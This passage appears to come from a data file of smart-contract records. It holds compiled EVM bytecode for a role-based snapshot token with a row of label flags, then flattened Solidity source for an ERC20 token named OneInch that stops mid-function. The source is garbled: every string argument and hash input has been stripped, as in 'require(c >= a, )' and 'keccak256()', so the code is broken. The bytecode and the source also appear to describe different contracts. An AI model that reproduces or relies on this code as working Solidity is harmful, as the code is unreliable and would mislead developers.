}}",0x608060405234801561001057600080fd5b50600436106101f05760003560e01c806370a082311161010f578063a217fddf116100a2578063d505accf11610071578063d505accf14610a7c578063d539139314610b15578063d547741f14610b33578063dd62ed3e14610b81576101f0565b8063a217fddf14610950578063a457c2d71461096e578063a9059cbb146109d4578063ca15c87314610a3a576101f0565b806391d14854116100de57806391d148541461081b57806395d89b41146108815780639711715a14610904578063981b24d01461090e576101f0565b806370a08231146106a557806379cc6790146106fd5780637ecebe001461074b5780639010d07c146107a3576101f0565b80633644e5151161018757806342966c681161015657806342966c68146105745780634ee2cd7e146105a257806354fd4d50146106045780637028e2cd14610687576101f0565b80633644e5151461045457806336568abe1461047257806339509351146104c057806340c10f1914610526576101f0565b8063248a9ca3116101c3578063248a9ca3146103825780632f2ff15d146103c457806330adf81f14610412578063313ce56714610430576101f0565b806306fdde03146101f5578063095ea7b31461027857806318160ddd146102de57806323b872dd146102fc575b600080fd5b6101fd610bf9565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561023d578082015181840152602081019050610222565b50505050905090810190601f16801561026a5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102c46004803603604081101561028e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610c9b565b604051808215151515815260200191505060405180910390f35b6102e6610cb9565b6040518082815260200191505060405180910390f35b6103686004803603606081101561031257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610cc3565b604051808215151515815260200191505060405180910390f35b6103ae6004803603602081101561039857600080fd5b8101908080359060200190929190505050610d9c565b6040518082815260200191505060405180910390f35b610410600480360360408110156103da57600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610dbb565b005b61041a610e44565b6040518082815260200191505060405180910390f35b610438610e68565b604051808260ff1660ff16815260200191505060405180910390f35b61045c610e7f565b6040518082815260200191505060405180910390f35b6104be6004803603604081101561048857600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610ea3565b005b61050c600480360360408110156104d657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610f3c565b604051808215151515815260200191505060405180910390f35b6105726004803603604081101561053c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610fef565b005b6105a06004803603602081101561058a57600080fd5b81019080803590602001909291905050506110b5565b005b6105ee600480360360408110156105b857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506110c9565b6040518082815260200191505060405180910390f35b61060c611139565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561064c578082015181840152602081019050610631565b50505050905090810190601f1680156106795780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61068f611172565b6040518082815260200191505060405180910390f35b6106e7600480360360208110156106bb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506111ab565b6040518082815260200191505060405180910390f35b6107496004803603604081101561071357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506111f4565b005b61078d6004803603602081101561076157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611256565b6040518082815260200191505060405180910390f35b6107d9600480360360408110156107b957600080fd5b81019080803590602001909291908035906020019092919050505061126e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6108676004803603604081101561083157600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061129f565b604051808215151515815260200191505060405180910390f35b6108896112d0565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156108c95780820151818401526020810190506108ae565b50505050905090810190601f1680156108f65780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61090c611372565b005b61093a6004803603602081101561092457600080fd5b8101908080359060200190929190505050611435565b6040518082815260200191505060405180910390f35b610958611466565b6040518082815260200191505060405180910390f35b6109ba6004803603604081101561098457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061146d565b604051808215151515815260200191505060405180910390f35b610a20600480360360408110156109ea57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061153a565b604051808215151515815260200191505060405180910390f35b610a6660048036036020811015610a5057600080fd5b8101908080359060200190929190505050611558565b6040518082815260200191505060405180910390f35b610b13600480360360e0811015610a9257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919080359060200190929190803560ff169060200190929190803590602001909291908035906020019092919050505061157e565b005b610b1d611830565b6040518082815260200191505060405180910390f35b610b7f60048036036040811015610b4957600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611869565b005b610be360048036036040811015610b9757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506118f2565b6040518082815260200191505060405180910390f35b606060048054600181600116156101000203166002900480601f016020809104026020016040519081016040528092919081815260200182805460018160011615610100020316600290048015610c915780601f10610c6657610100808354040283529160200191610c91565b820191906000526020600020905b815481529060010190602001808311610c7457829003601f168201915b5050505050905090565b6000610caf610ca86119a9565b84846119b1565b6001905092915050565b6000600354905090565b6000610cd0848484611ba8565b610d9184610cdc6119a9565b610d8c85604051806060016040528060288152602001612efe60289139600260008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000610d426119a9565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611bca9092919063ffffffff16565b6119b1565b600190509392505050565b6000806000838152602001908152602001600020600201549050919050565b610de160008084815260200190815260200160002060020154610ddc6119a9565b61129f565b610e36576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602f815260200180612df1602f913960400191505060405180910390fd5b610e408282611c8a565b5050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b6000600660009054906101000a900460ff16905090565b7f0f7e6db4bd29f5b0743e892c53690ee939ed780f756e0d021b93ed86993b03f481565b610eab6119a9565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614610f2e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602f815260200180612fd9602f913960400191505060405180910390fd5b610f388282611d1d565b5050565b6000610fe5610f496119a9565b84610fe08560026000610f5a6119a9565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611db090919063ffffffff16565b6119b1565b6001905092915050565b61103560405180807f4d494e5445525f524f4c45000000000000000000000000000000000000000000815250600b01905060405180910390206110306119a9565b61129f565b6110a7576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f4552525f4d494e5445525f524f4c45000000000000000000000000000000000081525060200191505060405180910390fd5b6110b18282611e38565b5050565b6110c66110c06119a9565b82611e57565b50565b600080600061111684600760008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020611e76565b915091508161112d57611128856111ab565b61112f565b805b9250505092915050565b6040518060400160405280600181526020017f310000000000000000000000000000000000000000000000000000000000000081525081565b60405180807f534e415053484f545f524f4c4500000000000000000000000000000000000000815250600d019050604051809103902081565b6000600160008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b600061123382604051806060016040528060248152602001612f26602491396112248661121f6119a9565b6118f2565b611bca9092919063ffffffff16565b9050611247836112416119a9565b836119b1565b6112518383611e57565b505050565b600b6020528060005260406000206000915090505481565b600061129782600080868152602001908152602001600020600001611fd090919063ffffffff16565b905092915050565b60006112c882600080868152602001908152602001600020600001611fea90919063ffffffff16565b905092915050565b606060058054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156113685780601f1061133d57610100808354040283529160200191611368565b820191906000526020600020905b81548152906001019060200180831161134b57829003601f168201915b5050505050905090565b6113b860405180807f534e415053484f545f524f4c4500000000000000000000000000000000000000815250600d01905060405180910390206113b36119a9565b61129f565b61142a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f4552525f534e415053484f545f524f4c4500000000000000000000000000000081525060200191505060405180910390fd5b61143261201a565b50565b6000806000611445846008611e76565b915091508161145b57611456610cb9565b61145d565b805b92505050919050565b6000801b81565b600061153061147a6119a9565b8461152b85604051806060016040528060258152602001612fb460259139600260006114a46119a9565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611bca9092919063ffffffff16565b6119b1565b6001905092915050565b600061154e6115476119a9565b8484611ba8565b6001905092915050565b6000611577600080848152602001908152602001600020600001612072565b9050919050565b834211156115f4576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f4552525f455850495245445f534947000000000000000000000000000000000081525060200191505060405180910390fd5b60006119017f0f7e6db4bd29f5b0743e892c53690ee939ed780f756e0d021b93ed86993b03f47f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98a8a8a600b60008f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000815480929190600101919050558b604051602001808781526020018673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001848152602001838152602001828152602001965050505050505060405160208183030381529060405280519060200120604051602001808461ffff1661ffff1660f01b8152600201838152602001828152602001935050505060405160208183030381529060405280519060200120905061177b81858585612087565b73ffffffffffffffffffffffffffffffffffffffff168873ffffffffffffffffffffffffffffffffffffffff161461181b576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600f8152602001807f4552525f494e56414c49445f534947000000000000000000000000000000000081525060200191505060405180910390fd5b6118268888886119b1565b5050505050505050565b60405180807f4d494e5445525f524f4c45000000000000000000000000000000000000000000815250600b019050604051809103902081565b61188f6000808481526020019081526020016000206002015461188a6119a9565b61129f565b6118e4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526030815260200180612eac6030913960400191505060405180910390fd5b6118ee8282611d1d565b5050565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b60006119a1836000018373ffffffffffffffffffffffffffffffffffffffff1660001b61228d565b905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611a37576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526024815260200180612f906024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611abd576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180612e426022913960400191505060405180910390fd5b80600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b611bb1836122fd565b611bba826122fd565b611bc5838383612350565b505050565b6000838311158290611c77576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015611c3c578082015181840152602081019050611c21565b50505050905090810190601f168015611c695780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b611cb18160008085815260200190815260200160002060000161197990919063ffffffff16565b15611d1957611cbe6119a9565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837f2f8788117e7eff1d82e926ec794901d17c78024a50270940304540a733656f0d60405160405180910390a45b5050565b611d448160008085815260200190815260200160002060000161261590919063ffffffff16565b15611dac57611d516119a9565b73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16837ff6391f5c32d9c69d2a47ea670b442974b53935d1edc7fd64eb21e047a839171b60405160405180910390a45b5050565b600080828401905083811015611e2e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b611e41826122fd565b611e49612645565b611e538282612659565b5050565b611e60826122fd565b611e68612645565b611e728282612822565b5050565b60008060008411611eef576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260168152602001807f4552433230536e617073686f743a20696420697320300000000000000000000081525060200191505060405180910390fd5b611ef9600a6129e8565b841115611f6e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f4552433230536e617073686f743a206e6f6e6578697374656e7420696400000081525060200191505060405180910390fd5b6000611f8685856000016129f690919063ffffffff16565b90508360000180549050811415611fa7576000808090509250925050611fc9565b6001846001018281548110611fb857fe5b906000526020600020015492509250505b9250929050565b6000611fdf8360000183612aab565b60001c905092915050565b6000612012836000018373ffffffffffffffffffffffffffffffffffffffff1660001b612b2e565b905092915050565b6000612026600a612b51565b6000612032600a6129e8565b90507f8030e83b04d87bef53480e26263266d6ca66863aa8506aca6f2559d18aa1cb67816040518082815260200191505060405180910390a18091505090565b600061208082600001612b67565b9050919050565b60007f7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a08260001c1115612105576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180612e8a6022913960400191505060405180910390fd5b601b8460ff161415801561211d5750601c8460ff1614155b15612173576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180612edc6022913960400191505060405180910390fd5b600060018686868660405160008152602001604052604051808581526020018460ff1660ff1681526020018381526020018281526020019450505050506020604051602081039080840390855afa1580156121d2573d6000803e3d6000fd5b505050602060405103519050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415612281576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f45434453413a20696e76616c6964207369676e6174757265000000000000000081525060200191505060405180910390fd5b80915050949350505050565b60006122998383612b2e565b6122f25782600001829080600181540180825580915050600190039060005260206000200160009091909190915055826000018054905083600101600084815260200190815260200160002081905550600190506122f7565b600090505b92915050565b61234d600760008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020612348836111ab565b612b78565b50565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156123d6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526025815260200180612f6b6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141561245c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180612dce6023913960400191505060405180910390fd5b612467838383612bf5565b6124d381604051806060016040528060268152602001612e6460269139600160008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611bca9092919063ffffffff16565b600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061256881600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611db090919063ffffffff16565b600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b600061263d836000018373ffffffffffffffffffffffffffffffffffffffff1660001b612bfa565b905092915050565b6126576008612652610cb9565b612b78565b565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156126fc576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b61270860008383612bf5565b61271d81600354611db090919063ffffffff16565b60038190555061277581600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611db090919063ffffffff16565b600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156128a8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526021815260200180612f4a6021913960400191505060405180910390fd5b6128b482600083612bf5565b61292081604051806060016040528060228152602001612e2060229139600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054611bca9092919063ffffffff16565b600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555061297881600354612ce290919063ffffffff16565b600381905550600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b600081600001549050919050565b60008083805490501415612a0d5760009050612aa5565b60008090506000848054905090505b80821015612a65576000612a308383612d2c565b905084868281548110612a3f57fe5b90600052602060002001541115612a5857809150612a5f565b6001810192505b50612a1c565b600082118015612a8d575083856001840381548110612a8057fe5b9060005260206000200154145b15612a9f576001820392505050612aa5565b81925050505b92915050565b600081836000018054905011612b0c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180612dac6022913960400191505060405180910390fd5b826000018281548110612b1b57fe5b9060005260206000200154905092915050565b600080836001016000848152602001908152602001600020541415905092915050565b6001816000016000828254019250508190555050565b600081600001805490509050919050565b6000612b84600a6129e8565b905080612b9384600001612d6e565b1015612bf05782600001819080600181540180825580915050600190039060005260206000200160009091909190915055826001018290806001815401808255809150506001900390600052602060002001600090919091909150555b505050565b505050565b60008083600101600084815260200190815260200160002054905060008114612cd65760006001820390506000600186600001805490500390506000866000018281548110612c4557fe5b9060005260206000200154905080876000018481548110612c6257fe5b9060005260206000200181905550600183018760010160008381526020019081526020016000208190555086600001805480612c9a57fe5b60019003818190600052602060002001600090559055866001016000878152602001908152602001600020600090556001945050505050612cdc565b60009150505b92915050565b6000612d2483836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250611bca565b905092915050565b60006002808381612d3957fe5b0660028581612d4457fe5b060181612d4d57fe5b0460028381612d5857fe5b0460028581612d6357fe5b040101905092915050565b60008082805490501415612d855760009050612da6565b81600183805490500381548110612d9857fe5b906000526020600020015490505b91905056fe456e756d657261626c655365743a20696e646578206f7574206f6620626f756e647345524332303a207472616e7366657220746f20746865207a65726f2061646472657373416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e20746f206772616e7445524332303a206275726e20616d6f756e7420657863656564732062616c616e636545524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545434453413a20696e76616c6964207369676e6174757265202773272076616c7565416363657373436f6e74726f6c3a2073656e646572206d75737420626520616e2061646d696e20746f207265766f6b6545434453413a20696e76616c6964207369676e6174757265202776272076616c756545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e20616d6f756e74206578636565647320616c6c6f77616e636545524332303a206275726e2066726f6d20746865207a65726f206164647265737345524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726f416363657373436f6e74726f6c3a2063616e206f6e6c792072656e6f756e636520726f6c657320666f722073656c66a264697066735822122036b4e29998092ccce603509a717a248dc22a68cd57e9675b7d52ce81d123ab3a64736f6c63430006080033,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity >=0.6.0 <0.8.0;abstract contract Context { function _msgSender() internal view virtual returns (address payable) { return msg.sender; } function _msgData() internal view virtual returns (bytes memory) { this; return msg.data; }}pragma solidity >=0.6.0 <0.8.0;interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}pragma solidity >=0.6.0 <0.8.0;library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; } function mod(uint256 a, uint256 b) internal pure returns (uint256) { return mod(a, b, ); } function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b != 0, errorMessage); return a % b; }}pragma solidity >=0.6.0 <0.8.0;contract ERC20 is Context, IERC20 { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; uint256 private _totalSupply; string private _name; string private _symbol; uint8 private _decimals; constructor (string memory name_, string memory symbol_) public { _name = name_; _symbol = symbol_; _decimals = 18; } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _totalSupply; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public virtual override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, )); return true; } function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue)); return true; } function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) { _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, )); return true; } function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(sender != address(0), ); require(recipient != address(0), ); _beforeTokenTransfer(sender, recipient, amount); _balances[sender] = _balances[sender].sub(amount, ); _balances[recipient] = _balances[recipient].add(amount); emit Transfer(sender, recipient, amount); } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(address(0), account, amount); _totalSupply = _totalSupply.add(amount); _balances[account] = _balances[account].add(amount); emit Transfer(address(0), account, amount); } function _burn(address account, uint256 amount) internal virtual { require(account != address(0), ); _beforeTokenTransfer(account, address(0), amount); _balances[account] = _balances[account].sub(amount, ); _totalSupply = _totalSupply.sub(amount); emit Transfer(account, address(0), amount); } function _approve(address owner, address spender, uint256 amount) internal virtual { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _setupDecimals(uint8 decimals_) internal { _decimals = decimals_; } function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }}pragma solidity >=0.6.0 <0.8.0;abstract contract ERC20Burnable is Context, ERC20 { using SafeMath for uint256; function burn(uint256 amount) public virtual { _burn(_msgSender(), amount); } function burnFrom(address account, uint256 amount) public virtual { uint256 decreasedAllowance = allowance(account, _msgSender()).sub(amount, ); _approve(account, _msgSender(), decreasedAllowance); _burn(account, amount); }}pragma solidity >=0.6.0 <0.8.0;abstract contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () internal { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}pragma solidity >=0.6.0 <0.8.0;library Counters { using SafeMath for uint256; struct Counter { uint256 _value; } function current(Counter storage counter) internal view returns (uint256) { return counter._value; } function increment(Counter storage counter) internal { counter._value += 1; } function decrement(Counter storage counter) internal { counter._value = counter._value.sub(1); }}pragma solidity ^0.6.0;interface IERC20Permit { function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external; function nonces(address owner) external view returns (uint256); function DOMAIN_SEPARATOR() external view returns (bytes32);}pragma solidity ^0.6.0;library ECDSA { function recover(bytes32 hash, bytes memory signature) internal pure returns (address) { if (signature.length != 65) { revert(); } bytes32 r; bytes32 s; uint8 v; assembly { r := mload(add(signature, 0x20)) s := mload(add(signature, 0x40)) v := byte(0, mload(add(signature, 0x60))) } return recover(hash, v, r, s); } function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal pure returns (address) { require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, ); require(v == 27 || v == 28, ); address signer = ecrecover(hash, v, r, s); require(signer != address(0), ); return signer; } function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) { return keccak256(abi.encodePacked(, hash)); }}pragma solidity ^0.6.0;abstract contract EIP712 { bytes32 private immutable _CACHED_DOMAIN_SEPARATOR; uint256 private immutable _CACHED_CHAIN_ID; bytes32 private immutable _HASHED_NAME; bytes32 private immutable _HASHED_VERSION; bytes32 private immutable _TYPE_HASH; constructor(string memory name, string memory version) internal { bytes32 hashedName = keccak256(bytes(name)); bytes32 hashedVersion = keccak256(bytes(version)); bytes32 typeHash = keccak256(); _HASHED_NAME = hashedName; _HASHED_VERSION = hashedVersion; _CACHED_CHAIN_ID = _getChainId(); _CACHED_DOMAIN_SEPARATOR = _buildDomainSeparator(typeHash, hashedName, hashedVersion); _TYPE_HASH = typeHash; } function _domainSeparatorV4() internal view returns (bytes32) { if (_getChainId() == _CACHED_CHAIN_ID) { return _CACHED_DOMAIN_SEPARATOR; } else { return _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION); } } function _buildDomainSeparator(bytes32 typeHash, bytes32 name, bytes32 version) private view returns (bytes32) { return keccak256( abi.encode( typeHash, name, version, _getChainId(), address(this) ) ); } function _hashTypedDataV4(bytes32 structHash) internal view returns (bytes32) { return keccak256(abi.encodePacked(, _domainSeparatorV4(), structHash)); } function _getChainId() private pure returns (uint256 chainId) { assembly { chainId := chainid() } }}pragma solidity ^0.6.0;abstract contract ERC20Permit is ERC20, IERC20Permit, EIP712 { using Counters for Counters.Counter; mapping (address => Counters.Counter) private _nonces; bytes32 private immutable _PERMIT_TYPEHASH = keccak256(); function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual override { require(block.timestamp <= deadline, ); bytes32 structHash = keccak256( abi.encode( _PERMIT_TYPEHASH, owner, spender, value, _nonces[owner].current(), deadline ) ); bytes32 hash = _hashTypedDataV4(structHash); address signer = ECDSA.recover(hash, v, r, s); require(signer == owner, ); _nonces[owner].increment(); _approve(owner, spender, value); } function nonces(address owner) public view override returns (uint256) { return _nonces[owner].current(); } function DOMAIN_SEPARATOR() external view override returns (bytes32) { return _domainSeparatorV4(); }}pragma solidity ^0.6.0;contract OneInch is ERC20Permit, ERC20Burnable, Ownable { constructor(address _owner) public ERC20(, ) EIP712(, ) { _mint(_owner, 1.5e9 ether); transferOwnership(_owner); } function mint(address to, uint256 amount) external onlyOwner { _mint(to, amount); 